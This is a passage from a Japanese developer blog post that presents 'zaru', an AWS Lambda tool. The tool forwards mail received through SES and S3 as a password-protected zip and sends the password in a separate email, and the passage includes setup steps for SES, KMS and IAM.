        <span class="n">src_file_names</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"</span><span class="si">%s</span><span class="s2">/</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">tmp_dir</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">tmp_dir</span><span class="p">)]</span>

        <span class="n">pyminizip</span><span class="o">.</span><span class="n">compress_multiple</span><span class="p">(</span><span class="n">src_file_names</span><span class="p">,</span> <span class="n">dst_file_path</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>

        <span class="c1"># # 生成したzipファイルを読み込み</span>
        <span class="n">r</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">dst_file_path</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
        <span class="n">zip_data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">return</span> <span class="n">zip_data</span>

    <span class="k">def</span> <span class="nf">_forward_with_zip</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">zip_name</span><span class="p">,</span> <span class="n">zip_data</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        パスワード付きZipファイルのデータを生成</span>
<span class="sd">        """</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_send_message</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'subject'</span><span class="p">],</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s2">"body"</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">encode</span><span class="p">),</span>
                <span class="n">zip_name</span><span class="p">,</span>
                <span class="n">zip_data</span>
                <span class="p">)</span>
        <span class="k">return</span>

    <span class="k">def</span> <span class="nf">_send_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">zip_name</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        zipファイルのパスワードを送信</span>
<span class="sd">        """</span>

        <span class="n">subject</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'subject'</span><span class="p">]</span>

        <span class="n">message</span> <span class="o">=</span> <span class="s2">"""</span>
<span class="s2">先ほどお送りしたファイルのパスワードのお知らせです。</span>

<span class="s2">[件名] {}</span>
<span class="s2">[ファイル名] {}.zip</span>
<span class="s2">[パスワード] {}</span>
<span class="s2">        """</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span> <span class="n">zip_name</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">_send_message</span><span class="p">(</span>
                <span class="s1">'[password]</span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="n">subject</span><span class="p">,</span>
                <span class="n">message</span><span class="p">,</span>
                <span class="bp">None</span><span class="p">,</span>
                <span class="bp">None</span>
                <span class="p">)</span>
        <span class="k">return</span>

    <span class="k">def</span> <span class="nf">_send_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">attach_name</span><span class="p">,</span> <span class="n">attach_data</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        メール送信</span>
<span class="sd">        """</span>

        <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>

        <span class="c1"># ヘッダ</span>
        <span class="n">msg</span><span class="p">[</span><span class="s1">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
        <span class="n">msg</span><span class="p">[</span><span class="s1">'From'</span><span class="p">]</span>    <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'from'</span><span class="p">]</span>
        <span class="n">msg</span><span class="p">[</span><span class="s1">'To'</span><span class="p">]</span>      <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'reply_to'</span><span class="p">]</span>
        <span class="n">msg</span><span class="p">[</span><span class="s1">'Bcc'</span><span class="p">]</span>     <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'from'</span><span class="p">]</span>

        <span class="c1"># 本文</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="s1">'plain'</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">encode</span><span class="p">)</span>
        <span class="n">msg</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>

        <span class="c1"># 添付ファイル</span>
        <span class="k">if</span> <span class="n">attach_data</span><span class="p">:</span>
            <span class="n">file_name</span> <span class="o">=</span> <span class="s2">"</span><span class="si">%s</span><span class="s2">.zip"</span> <span class="o">%</span> <span class="n">attach_name</span>
            <span class="n">attachment</span> <span class="o">=</span> <span class="n">MIMEBase</span><span class="p">(</span><span class="s1">'application'</span><span class="p">,</span> <span class="s1">'zip'</span><span class="p">)</span>
            <span class="n">attachment</span><span class="o">.</span><span class="n">set_param</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
            <span class="n">attachment</span><span class="o">.</span><span class="n">set_payload</span><span class="p">(</span><span class="n">attach_data</span><span class="p">)</span>
            <span class="n">encoders</span><span class="o">.</span><span class="n">encode_base64</span><span class="p">(</span><span class="n">attachment</span><span class="p">)</span>
            <span class="n">attachment</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">"Content-Dispositon"</span><span class="p">,</span> <span class="s2">"attachment"</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">file_name</span><span class="p">)</span>
            <span class="n">msg</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">attachment</span><span class="p">)</span>

        <span class="c1"># 送信</span>
        <span class="n">smtp_server</span>   <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decrypted_environ</span><span class="p">(</span><span class="s2">"SMTP_SERVER"</span><span class="p">)</span>
        <span class="n">smtp_port</span>     <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decrypted_environ</span><span class="p">(</span><span class="s2">"SMTP_PORT"</span><span class="p">)</span>
        <span class="n">smtp_user</span>     <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decrypted_environ</span><span class="p">(</span><span class="s2">"SMTP_USER"</span><span class="p">)</span>
        <span class="n">smtp_password</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decrypted_environ</span><span class="p">(</span><span class="s2">"SMTP_PASSWORD"</span><span class="p">)</span>
        <span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">smtp_server</span><span class="p">,</span> <span class="n">smtp_port</span><span class="p">)</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">ehlo</span><span class="p">()</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">starttls</span><span class="p">()</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">ehlo</span><span class="p">()</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">smtp_user</span><span class="p">,</span> <span class="n">smtp_password</span><span class="p">)</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">send_message</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"Successfully sent email"</span><span class="p">)</span>

        <span class="k">return</span>

    <span class="k">def</span> <span class="nf">_get_decrypted_environ</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        暗号化された環境変数を復号化</span>
<span class="sd">        """</span>

        <span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s1">'kms'</span><span class="p">)</span>
        <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="n">key</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">client</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">CiphertextBlob</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">))[</span><span class="s1">'Plaintext'</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>

    <span class="c1"># イベントからバケット名、キー名を取得</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">event</span><span class="p">[</span><span class="s1">'Records'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'s3'</span><span class="p">][</span><span class="s1">'bucket'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">event</span><span class="p">[</span><span class="s1">'Records'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'s3'</span><span class="p">][</span><span class="s1">'object'</span><span class="p">][</span><span class="s1">'key'</span><span class="p">])</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># S3からファイルの中身を読み込む</span>
        <span class="n">s3_object</span> <span class="o">=</span> <span class="n">s3</span><span class="o">.</span><span class="n">get_object</span><span class="p">(</span><span class="n">Bucket</span><span class="o">=</span><span class="n">bucket</span><span class="p">,</span> <span class="n">Key</span><span class="o">=</span><span class="n">key</span><span class="p">)</span>
        <span class="n">email_string</span> <span class="o">=</span> <span class="n">s3_object</span><span class="p">[</span><span class="s1">'Body'</span><span class="p">]</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>

        <span class="c1"># メールを解析</span>
        <span class="n">parser</span> <span class="o">=</span> <span class="n">MailParser</span><span class="p">(</span><span class="n">email_string</span><span class="p">)</span>

        <span class="c1"># メール転送</span>
        <span class="n">forwarder</span> <span class="o">=</span> <span class="n">MailForwarder</span><span class="p">(</span><span class="n">parser</span><span class="o">.</span><span class="n">get_attr_data</span><span class="p">())</span>
        <span class="n">forwarder</span><span class="o">.</span><span class="n">send</span><span class="p">()</span>
        <span class="k">return</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">raise</span> <span class="n">e</span>
</pre></div></div>

<h3>
<span id="pyminizip" class="fragment"></span><a href="#pyminizip"><i class="fa fa-link"></i></a>pyminizip</h3>

<p>パスワード付きzipは標準のライブラリじゃできないっぽい。<br>
ということで、ここだけ<a href="https://github.com/smihica/pyminizip" rel="nofollow noopener" target="_blank">pyminizip</a>という外部ライブラリに頼りました。<br>
ただこれ、インストール時にビルドしてバイナリ作る系のライブラリだったので、Lambdaで動かすためにローカルでAmazonLinuxのDockerコンテナ立ててバイナリを作りました。何かほかにいい方法あるのかな。。</p>

<h3>
<span id="aws-sam" class="fragment"></span><a href="#aws-sam"><i class="fa fa-link"></i></a>AWS SAM</h3>

<p>ちなみに、これは<a href="https://github.com/awslabs/aws-sam-local" rel="nofollow noopener" target="_blank">AWS SAM</a>を使ってローカルテストしてみました。<br>
SMTPサーバーの情報を直書きして試してたところまでは良かったけど、それを環境変数に移すとうまく動かなくて挫折しました。<a href="https://github.com/awslabs/aws-sam-local/issues/49" rel="nofollow noopener" target="_blank">修正はされてるけどリリースされてないっぽい。</a></p>

<h2>
<span id="導入方法" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>導入方法</h2>

<p>せっかくなので公開してみます。コードネーム<code>zaru</code>。<br>
かなり設定方法が泥臭いままですがご容赦ください。。<br>
<a href="https://github.com/Kta-M/zaru" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/Kta-M/zaru</a></p>

<p>自分の環境(Mac, Thunderbird)でしか試してないので、メーラーやその他環境によってはうまくいかないかも？自己責任でお願いします。</p>

<h3>
<span id="ses" class="fragment"></span><a href="#ses"><i class="fa fa-link"></i></a>SES</h3>

<p>SESはまだ東京リージョンで使えないので、オレゴンリージョン(us-west-2)で構築します。</p>

<h4>
<span id="ドメイン検証" class="fragment"></span><a href="#%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E6%A4%9C%E8%A8%BC"><i class="fa fa-link"></i></a>ドメイン検証</h4>

<p>まずはSESに向けてメールが送れるように、ドメインの検証を行います。<br>
やり方はいろいろなので、このあたりは割愛。<br>
たとえばこのあたりとか参考になるかも -&gt; <a href="http://qiita.com/tanakaworld/items/94f1ba66801100f6a44f" id="reference-1100ac127e7efb74ffde">RailsでAmazon SES・Route53を用いてドメインメールを送信する</a></p>

<h4>
<span id="rule作成" class="fragment"></span><a href="#rule%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>Rule作成</h4>

<p>ドメインの検証ができたら、Ruleを作成します。</p>

<p>メニュー右側の<code>Rule Sets</code>から、<code>View Active Rule Set</code>をクリック。<br>
<a href="https://camo.qiitausercontent.com/240450d00784e716203a85962ee933e6e281175b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f39656635393164322d666462302d356364642d646430382d3865376431393938663831642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/240450d00784e716203a85962ee933e6e281175b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f39656635393164322d666462302d356364642d646430382d3865376431393938663831642e706e67" alt="ses_rule_01.png" title="ses_rule_01.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/9ef591d2-fdb0-5cdd-dd08-8e7d1998f81d.png"></a></p>

<p><code>Create Rule</code>をクリック。<br>
<a href="https://camo.qiitausercontent.com/d93f6b24909b10365e573d3b9394c6ef70b355ea/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f63396663616333612d323937302d383865662d663232622d3339363764363565313265382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d93f6b24909b10365e573d3b9394c6ef70b355ea/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f63396663616333612d323937302d383865662d663232622d3339363764363565313265382e706e67" alt="ses_rule_02.png" title="ses_rule_02.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/c9fcac3a-2970-88ef-f22b-3967d65e12e8.png"></a></p>

<p>受信するメールアドレスを登録。検証を行なったドメインのメールアドレスを入力して、<code>Add Recipient</code>をクリック。<br>
<a href="https://camo.qiitausercontent.com/051f2443663b98513408c5e0e0fce4999f9b91f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f63333463306136392d396237662d663839342d303265632d3234346232343033316135652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/051f2443663b98513408c5e0e0fce4999f9b91f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f63333463306136392d396237662d663839342d303265632d3234346232343033316135652e706e67" alt="ses_rule_03.png" title="ses_rule_03.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/c34c0a69-9b7f-f894-02ec-244b24031a5e.png"></a></p>

<p>メール受信時のアクションを登録。<br>
アクションタイプとして<code>S3</code>を選択し、受信したメールデータを保存するバケットを指定します。このとき、<code>Create S3 bucket</code>でバケットを作成してあげると、必要なバケットポリシーが自動で登録されて便利。<br>
SESからバケットへのファイルアップロードを許可するポリシーが設定されます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowSESPuts-XXXXXXXXXXXX",
            "Effect": "Allow",
            "Principal": {
                "Service": "ses.amazonaws.com"
            },
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::&lt;ses-bucket-name&gt;/*",
            "Condition": {
                "StringEquals": {
                    "aws:Referer": "XXXXXXXXXXXX"
                }
            }
        }
    ]
}
</pre></div></div>

<p>また、バケットに保存されたメールデータは、貯めておいても仕方ないので、ライフサイクルを設定して一定期間経過後削除されるようにしておくといいかも。<br>
<a href="https://camo.qiitausercontent.com/66b6630216b1bdc1d0e90d554914175fcc3ddaab/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f35303034303037372d666561342d396539312d356233362d3963316136333264333562302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/66b6630216b1bdc1d0e90d554914175fcc3ddaab/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f35303034303037372d666561342d396539312d356233362d3963316136333264333562302e706e67" alt="ses_rule_04.png" title="ses_rule_04.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/50040077-fea4-9e91-5b36-9c1a632d35b0.png"></a></p>

<p>ルールに名前を付けます。あとはデフォルトで。<br>
<a href="https://camo.qiitausercontent.com/3e477599cd992e89c51a2fd721f805f0e6c52b99/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f39653563643338332d373366392d303933372d353136322d3266313436616363613565632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3e477599cd992e89c51a2fd721f805f0e6c52b99/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f39653563643338332d373366392d303933372d353136322d3266313436616363613565632e706e67" alt="ses_rule_05.png" title="ses_rule_05.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/9e5cd383-73f9-0937-5162-2f146acca5ec.png"></a></p>

<p>登録内容を確認して、登録！<br>
<a href="https://camo.qiitausercontent.com/7baacbebb2df5518918033d887418fa729c64af1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f38303938636138332d303864662d626262332d616665632d3031393236346565613939372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7baacbebb2df5518918033d887418fa729c64af1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f38303938636138332d303864662d626262332d616665632d3031393236346565613939372e706e67" alt="ses_rule_06.png" title="ses_rule_06.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/8098ca83-08df-bbb3-afec-019264eea997.png"></a></p>

<h3>
<span id="lambda-1" class="fragment"></span><a href="#lambda-1"><i class="fa fa-link"></i></a>Lambda</h3>

<h4>
<span id="デプロイ" class="fragment"></span><a href="#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4"><i class="fa fa-link"></i></a>デプロイ</h4>

<p>SESと同じくオレゴンリージョンにデプロイします。<br>
CloudFormationを利用するので、データをアップロードするS3バケットを作っておいてください。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span># git clone git@github.com:Kta-M/zaru.git
# cd zaru
# aws cloudformation package --template-file template.yaml --s3-bucket &lt;cfn-bucket-name&gt; --output-template-file packaged.yaml
# aws cloudformation deploy --template-file packaged.yaml --stack-name zaru-stack --capabilities CAPABILITY_IAM --region us-west-2
</pre></div></div>

<p>Lambdaのコンソールに行くと、関数が作成されています。<br>
また、この関数の実行に必要なIAMロールも作成されています。<br>
<a href="https://camo.qiitausercontent.com/8e4d23a54aa6d3739fe0c3b2362a8bb92508390c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f31656637643435622d316539362d643030372d666130322d3836323230376234653830392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8e4d23a54aa6d3739fe0c3b2362a8bb92508390c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f31656637643435622d316539362d643030372d666130322d3836323230376234653830392e706e67" alt="lambda_01.png" title="lambda_01.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/1ef7d45b-1e96-d007-fa02-862207b4e809.png"></a></p>

<h4>
<span id="トリガー設定" class="fragment"></span><a href="#%E3%83%88%E3%83%AA%E3%82%AC%E3%83%BC%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>トリガー設定</h4>

<p>バケットにメールデータが入るのをトリガーにして、Lambdaが動くように設定します。</p>

<p>関数の詳細画面のトリガータブに移動します。<br>
<a href="https://camo.qiitausercontent.com/de10929b2b0768808aa5d752f87b397ac7e59997/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f61633333323533662d333234612d643163392d393534382d3563623066393935373438392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/de10929b2b0768808aa5d752f87b397ac7e59997/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f61633333323533662d333234612d643163392d393534382d3563623066393935373438392e706e67" alt="lambda_02.png" title="lambda_02.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/ac33253f-324a-d1c9-9548-5cb0f9957489.png"></a></p>

<p><code>トリガーを追加</code>をクリックし、S3のイベントを作成します。<br>
SESからデータが来るバケット、イベントタイプはPutです。それ以外はデフォルト。<br>
バケットは<a href="https://camo.qiitausercontent.com/41afc8982e5b30db5185f6e8f0a0ecdaa9f69afe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f64356564663938372d356630632d613734302d316239632d3364316232346565613932322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/41afc8982e5b30db5185f6e8f0a0ecdaa9f69afe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f64356564663938372d356630632d613734302d316239632d3364316232346565613932322e706e67" alt="lambda_03.png" title="lambda_03.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/d5edf987-5f0c-a740-1b9c-3d1b24eea922.png"></a></p>

<h4>
<span id="暗号化キーを作成" class="fragment"></span><a href="#%E6%9A%97%E5%8F%B7%E5%8C%96%E3%82%AD%E3%83%BC%E3%82%92%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>暗号化キーを作成</h4>

<p>このLambda関数内では、暗号化された環境変数からSMTP関連の情報を取得しています。<br>
その暗号化に使用するキーを作成します。</p>

<p>IAMコンソールから、左下にある<code>暗号化キー</code>をクリックします。<br>
リージョンをオレゴンに変更し、キーを作成してください。<br>
<a href="https://camo.qiitausercontent.com/26a6ab30bffab485d16e860de00703df56e4e708/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f34663961653766632d653435312d353661312d303939372d3037646633333162396534662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/26a6ab30bffab485d16e860de00703df56e4e708/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f34663961653766632d653435312d353661312d303939372d3037646633333162396534662e706e67" alt="lambda_04.png" title="lambda_04.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/4f9ae7fc-e451-56a1-0997-07df331b9e4f.png"></a></p>

<p>設定内容は、任意のエイリアスを設定するだけで、残りはデフォルトでOKです。<br>
<a href="https://camo.qiitausercontent.com/8999e049be63faa1efb1363ca573523c0177ed0d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f31346561356564332d373034312d303438382d396132382d3438633334346133363663312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8999e049be63faa1efb1363ca573523c0177ed0d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f31346561356564332d373034312d303438382d396132382d3438633334346133363663312e706e67" alt="lambda_05.png" title="lambda_05.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/14ea5ed3-7041-0488-9a28-48c344a366c1.png"></a></p>

<h4>
<span id="環境変数数設定" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E6%95%B0%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>環境変数数設定</h4>

<p>Lambdaに戻って、関数内で使用する環境変数を設定します。<br>
コードタブの下のほうに、環境変数を設定するフォームがあります。<br>
<code>暗号化ヘルパーを有効にする</code>にチェックを入れ、先ほど作成した暗号化キーを指定します。<br>
環境変数は、変数名と値(平文)を入力し、<code>暗号化</code>ボタンを押します。すると、指定した暗号化キーで暗号化してくれます。<br>
設定する環境変数は以下の4つです。</p>

<table>
<thead>
<tr>
<th style="text-align: left">変数名</th>
<th style="text-align: left">説明</th>
<th style="text-align: left">例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">SMTP_SERVER</td>
<td style="text-align: left">smtpサーバー</td>
<td style="text-align: left">smtp.example.com</td>
</tr>
<tr>
<td style="text-align: left">SMTP_PORT</td>
<td style="text-align: left">smtpポート</td>
<td style="text-align: left">587</td>
</tr>
<tr>
<td style="text-align: left">SMTP_USER</td>
<td style="text-align: left">smtpサーバーにログインするユーザー名</td>
<td style="text-align: left"><a href="mailto:test@example.com" class="autolink">test@example.com</a></td>
</tr>
<tr>
<td style="text-align: left">SMTP_PASSWORD</td>
<td style="text-align: left">SMTP_USERのパスワード</td>
<td style="text-align: left"></td>
</tr>
</tbody>
</table>

<p><a href="https://camo.qiitausercontent.com/2a79ebbf1865a81729d14eebcb58e0dd18b8baa1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f65653339383436642d636133352d383835312d643830322d3036636463306562666534362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2a79ebbf1865a81729d14eebcb58e0dd18b8baa1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f65653339383436642d636133352d383835312d643830322d3036636463306562666534362e706e67" alt="lambda_06.png" title="lambda_06.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/ee39846d-ca35-8851-d802-06cdc0ebfe46.png"></a></p>

<h4>
<span id="ロール設定" class="fragment"></span><a href="#%E3%83%AD%E3%83%BC%E3%83%AB%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>ロール設定</h4>

<p>最後に、このLambda関数を実行するロールに必要な権限を付けます。<br>
- メールデータを保存するS3バケットからデータを取得する権限<br>
- 暗号化キーを使って環境変数を復号する権限</p>

<p>まず、IAMコンソールの<code>ポリシー</code>に行き、<code>ポリシーの作成</code>-&gt;<code>独自のポリシーを作成</code>で以下の2つのポリシーを作成します。<br>
<a href="https://camo.qiitausercontent.com/5c31b3fad0bd8e8232c34c54061a5606576cb922/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f38346435363036302d343834302d663138342d353163392d3736386536646434396362392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5c31b3fad0bd8e8232c34c54061a5606576cb922/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f38346435363036302d343834302d663138342d353163392d3736386536646434396362392e706e67" alt="lambda_07.png" title="lambda_07.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/84d56060-4840-f184-51c9-768e6dd49cb9.png"></a></p>

<p><strong>ポリシー：s3-get-object-zaru</strong><br>
<code>&lt;ses-bucket-name&gt;</code>には、SESからメールデータを受け取るバケット名を指定してください。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Stmt1505586008000",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject"
            ],
            "Resource": [
                "arn:aws:s3:::&lt;ses-bucket-name&gt;/*"
            ]
        }
    ]
}
</pre></div></div>

<p><strong>ポリシー；kms-decrypt-zaru</strong><br>
<code>&lt;kms-arn&gt;</code>には、暗号化キーのARNを指定してください。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Stmt1448696327000",
            "Effect": "Allow",
